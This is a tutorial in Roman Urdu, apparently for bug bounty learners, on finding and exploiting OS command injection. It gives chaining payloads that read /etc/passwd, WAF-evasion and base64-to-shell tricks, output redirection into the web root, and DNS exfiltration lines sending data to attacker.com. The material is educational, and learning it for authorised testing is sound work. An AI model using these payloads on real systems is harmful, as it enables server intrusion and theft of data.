### ⚡ Important Hidden Points about OS Command Injection:

1. **Whitespace bypass**
   Developer agar spaces block kare, toh hum tabs (`%09`), newlines (`%0a`), `$IFS` ya `{cat,file.txt}` style se space bypass kar sakte hain. Yeh trick kaam logon ko pata hoti hai.

2. **Output redirection**
   Blind injection mein agar response na aaye, toh hum output ko file mein save karwa sakte hain (`> /var/www/html/test.txt`) aur phir browser se woh file access kar ke result dekh sakte hain.

3. **Operators ke chaining power**
   Sirf `;` use nahi hota — `&&`, `||`, `|`, `` `command` ``, `$(command)` — yeh sab alternative hain aur different behavior dete hain. Example: `&&` sirf tab chalega jab pehla command successful ho.

4. **Encoding & Obfuscation**
   Command injection ko WAF block karne ki koshish kare toh hum Base64 encoding (`echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`) ya hex/URL encoding se commands chala sakte hain.

5. **Environment Variables abuse**
   Kaam log jante hain ke `$PATH`, `$HOME`, `$SHELL`, `$UID` direct injection mein kaam aa sakte hain. Example: `;echo $PATH;` se sensitive info leak ho jaata hai.

6. **Time-based blind tricks**
   Agar response na aaye toh `ping -c 10 127.0.0.1` ya `sleep 10` use kar ke delay create kar dete hain. Isse confirm hota hai ke injection chal rahi hai.

7. **Chaining with existing commands**
   Agar developer `ping` ya `ls` hardcoded use kar raha hai, toh hum uske saath extra command jod dete hain. Example: `127.0.0.1; cat /etc/passwd`.

8. **Command Injection ≠ RCE always**
   Har injection RCE nahi hoti. Kabhi kabhi restricted shell, AppArmor, ya Docker container ke andar command execute hoti hai. Fir bhi sensitive info leak ho sakta hai.

9. **DNS exfiltration**
   Agar output dekhne ka tareeqa hi na ho, toh hum `nslookup $(cat /etc/passwd).attacker.com` type command daal kar apni controlled DNS server par data exfiltrate kar sakte hain. Yeh bahut kam log use karte hain.

10. **Developer ki common ghalti**
    Bohat saare developers input ko `escapeshellcmd()` ya `escapeshellarg()` (PHP) se sanitize karte hain, lekin yeh har case cover nahi karta. Agar proper whitelist na ho toh injection ho hi jaata hai.

---

💡 Penetration Testing ka faida:
Agar tum real world mein OS Command Injection pakar lo, toh tum **server ka full control (Privilege Escalation)** le sakte ho. Lekin agar full RCE possible na bhi ho, toh bhi tum sensitive files read, SSRF trigger, ya internal network access kar sakte ho — jo bug bounty mein **critical severity** hota hai.

---

### 🔑 OS Command Injection + `whoami` samajh lo:

1. Jab tum apne **Windows PC** par `whoami` chalate ho → tumhe apne system ka **current logged-in user** milta hai. Example:

   ```
   C:\Users\Muhammad Habib Awan
   whoami
   muhammadhabibawan
   ```

2. Agar tum **website ke server** par injection karte ho aur `whoami` run ho jata hai, toh woh **server ka user** dikhayega — na ke website ka owner ya domain ka user.
   Example:

   * Website: `khan.com`
   * Server: Linux chal raha hai aur Apache web server run ho raha hai
   * Apache usually `www-data` (Ubuntu) ya `apache` (CentOS) user ke under hota hai.
   * Tumhe milega:

     ```
     whoami
     www-data
     ```

3. Matlab tumhe **server par kis account se command chal rahi hai** yeh confirm ho jata hai. Isko “context” kehte hain.

4. Agar woh user `root` ho gaya → toh samjho tumne **server ka full control** le liya. Lekin aksar normal limited user milta hai (`www-data`, `apache`, `nginx`). Phir agla kaam hota hai **Privilege Escalation**.

---

👉 Tumhari example sahi hai, bas clarify yeh hai:

* Agar server Linux hai aur user `rock` se chal raha hai → toh `whoami` “rock” show karega.
* Agar server Windows hai aur user `Administrator` se chal raha hai → toh `whoami` “administrator” show karega.

---

⚡ Penetration Testing Tip:
Always pehla kaam injection confirm karne ke baad `whoami`, `uname -a`, `id` (Linux) ya `systeminfo` (Windows) chalana hota hai — isse tumhe **system ki fingerprinting** mil jaati hai. Yeh chhupi hui info bug bounty mein **critical proof of concept (PoC)** hoti hai.

---

Jo commands hum apne Linux ya Windows PC pe chalate hain **wohi same commands website ke server pe bhi chalti hain** agar tumhe OS Command Injection mil gaya ho.

---

### 📌 Example samajh lo:

#### Agar server **Linux** hai:

* `whoami` → kaunsa user chal raha hai (`www-data`, `root`, `nginx`)
* `id` → user ke groups + UID/GID
* `uname -a` → pura OS version (kernel info, Linux distro)
* `pwd` → current working directory
* `ls -la` → files/folders list

#### Agar server **Windows** hai:

* `whoami` → current user (e.g., `iis apppool\defaultapppool`)
* `systeminfo` → Windows version, hostname, patch level
* `echo %USERNAME%` → current username
* `echo %USERDOMAIN%` → domain/workgroup
* `dir` → files/folders list

---

### ⚡ Important baat:

Tum apne computer pe bhi yeh commands run karke dekh lo → jo result apke machine ka deta hai, wahi same tarike se server ke environment ka dega.
Farq bas itna hai ke:

* Tumhara PC → tumhari local info dikhayega.
* Website ka server → us server ka user + OS details dikhayega.

---

👉 Isi liye OS Command Injection itni powerful vulnerability hai — kyunki tum server ki andar ki **asli identity** dekh lete ho.
Bug bounty mein sirf `whoami` ka result proof of concept ke liye kaafi hota hai.

---

### 🔎 Scenario samajh lo:

1. **Ping test (`ping -c 10 127.0.0.1`)**
   Agar server 10 sec delay karta hai → iska matlab hai **server tumhari command sun raha hai**. Yani **OS Command Injection confirm** ✅.

2. **Next step: Information gathering**
   Naturally hum `whoami`, `id`, `uname -a`, ya `systeminfo` run karte hain taake system ki identity mile.

3. **Agar `whoami` ka response aa jaye**
   → Toh ye **Normal Command Injection** hai (response-based). Easy mode. Tum direct commands ke output dekh sakte ho.

4. **Agar `whoami` error de ya koi response na aaye**
   → Toh ye **Blind Command Injection** hai. Matlab command chal rahi hai, lekin tumhe **direct output nahi mil raha**.

---

### 🔧 Blind Command Injection handle karne ke tareeqe:

1. **Time-based technique**

   * Example: `sleep 5` ya `ping -c 5 127.0.0.1`
   * Isse confirm hota hai ke command chal rahi hai.

2. **File-based output redirection**

   * `whoami > /var/www/html/test.txt`
   * Phir browser se `khan.com/test.txt` open karke result dekh lo.

3. **DNS Exfiltration** (kaam log use karte hain ⚡)

   * `nslookup $(whoami).attacker.com`
   * Tumhare DNS server pe user ka naam chala aayega.

4. **Encoding / Obfuscation tricks**

   * Agar WAF block kar raha ho toh `whoami` ko encode karke chala sakte ho:

     ```
     echo d2hvYW1p | base64 -d | sh
     ```

     (yeh `whoami` ko Base64 se decode karke execute karega).

---

👉 Matlab:

* Agar response aa raha hai = **Direct Command Injection**
* Agar sirf delay ya side-effects mil rahe hain = **Blind Command Injection**
* Blind mein hum encoding, redirection aur exfiltration tricks se output nikalte hain.

---

⚡ PenTest Tip:
Bug bounty mein **sirf sleep/delay proof** dikhana bhi kaafi hota hai — kyunki ye hi critical severity proof hai ke tum OS ke commands execute kar rahe ho.

---

### 🔍 Agar `ping -c 10 127.0.0.1` ya `sleep 5` na chale toh?

* Yeh **100% proof nahi hai** ke OS Command Injection impossible hai.
* Matlab sirf itna hota hai ke tumhari **wo specific syntax** server ne accept nahi kiya.

---

### ⚡ Kya possibilities ho sakti hain?

1. **Different OS / Shell**

   * Tum `ping -c 10` (Linux style) use kar rahe ho, lekin shayad server Windows hai.
   * Windows mein `ping -n 10 127.0.0.1` hota hai aur delay ke liye `timeout 5` use hota hai.

2. **Different shell interpreter**

   * Har server `bash` nahi chalata.
   * Kabhi `sh`, `csh`, ya `powershell` hota hai.
   * Ek command jo bash mein chalti hai woh sh mein fail ho sakti hai.

3. **Output suppressed / sandboxed**

   * Kabhi-kabhi developer output ko log file mein redirect kar deta hai ya sanitize kar deta hai. Tumhe error dikh raha hai, lekin andar command chal bhi sakti hai.

4. **WAF / Filtering**

   * Agar WAF laggi hai toh woh `sleep`, `ping`, `whoami` jaise common keywords ko block kar deti hai.
   * Lekin tum obfuscation (e.g., `sl\eep 5`, base64 decode, variable tricks) se bypass kar sakte ho.

5. **Partial injection possible**

   * Ho sakta hai tum sirf ek parameter mein inject kar rahe ho aur woh vulnerable na ho.
   * Dusre parameters (headers, cookies, hidden fields) vulnerable ho sakte hain.

---

### 🛠️ Real Pentester Approach

Agar simple commands fail ho jayein toh tester kya karta hai:

* Linux ke liye test:

  ```
  ;id;
  ;uname -a;
  ;cat /etc/passwd;
  ```
* Windows ke liye test:

  ```
  & whoami
  & ver
  & dir
  & echo test
  ```
* WAF bypass ke liye:

  * Command ko split karna → `who$uami`
  * Encodings → URL encode (`%77hoami`), Base64, Hex
  * Variables → `${PATH}`, `$IFS`, `%USERNAME%`

---

👉 Matlab: Agar ek do commands fail ho jayein toh iska matlab **injection impossible nahi hoti**.
Tumhe **OS + shell identify karke, obfuscation aur alternate syntax try karna padta hai**.

---

⚡ PenTest Tip:
Kabhi apni testing approach ko **cross-OS mindset** se dekhna. Matlab ek hi parameter ko Linux aur Windows dono style se test karo. Bahut cases mein log `sleep` try kar ke chhod dete hain aur Windows commands test hi nahi karte.

---

### 🔑 Bash kya hai?

* **Bash** ka full form hai: **Bourne Again Shell**.
* Yeh basically ek **command-line shell aur scripting language** hai jo **Linux** aur **Mac** systems par default hoti hai.
* Matlab jo bhi tum Linux mein terminal pe command likhte ho (`ls`, `pwd`, `cat /etc/passwd`, etc.) woh **bash** interpret karke OS ko samjhata hai.

---

### ⚙️ Role of Bash in Servers

* Websites jo **Linux server** pe chalti hain (Apache, Nginx), unke background mein agar developer ne user input ko system command ke sath concatenate kar diya → woh command **bash shell** ko chali jaati hai.
* Example:

  ```php
  system("ping -c 1 " . $_GET['ip']);
  ```

  Agar tumne `; whoami` inject kiya → toh woh `ping -c 1 127.0.0.1; whoami` ban jaata hai → aur **bash usse execute kar deta hai**.

---

### 🛠️ Real-world samajh lo:

* Tum apne Windows PC mein **cmd** use karte ho (black window).
* Linux/Mac users **bash** use karte hain (terminal).
* Dono ka kaam same: **commands ko OS tak pohchana aur output dena**.

---

### ⚡ Penetration Testing angle

1. OS Command Injection zyada tar Linux servers pe milegi, matlab **bash commands** chalengi.
2. Agar server Windows hai toh tumhe **cmd** ya **PowerShell** style commands test karni hongi (`dir`, `ver`, `timeout`, etc.).
3. Bash mein bohot saare **special operators** hote hain jo injection ke liye goldmine hain:

   * `;` → command chaining
   * `&&` / `||` → conditional execution
   * `` `command` `` ya `$(command)` → command substitution
   * `$IFS` → space bypass

---

👉 Matlab:
**Bash ek interpreter hai jo tumhari commands ko samjhata hai aur execute karwata hai.**
Agar tum OS Command Injection crack karna chahte ho toh bash ka thoda game seekhna zaroori hai.
